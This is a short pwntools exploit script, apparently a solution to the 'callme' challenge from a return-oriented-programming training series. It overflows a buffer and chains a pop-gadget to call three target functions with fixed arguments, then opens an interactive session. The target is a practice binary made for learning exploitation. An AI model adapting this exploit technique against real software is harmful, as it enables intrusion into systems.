from pwn import *

elf = ELF("./callme")

p = elf.process()
raw_input("DEBUG")
pop_rdi_rsi_rdx = 0x000000000040093c

payload = b"A"*40
payload += p64(pop_rdi_rsi_rdx)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(elf.sym['callme_one'])
payload += p64(pop_rdi_rsi_rdx)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(elf.sym['callme_two'])
payload += p64(pop_rdi_rsi_rdx)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(elf.sym['callme_three'])

p.sendline(payload)

p.interactive()
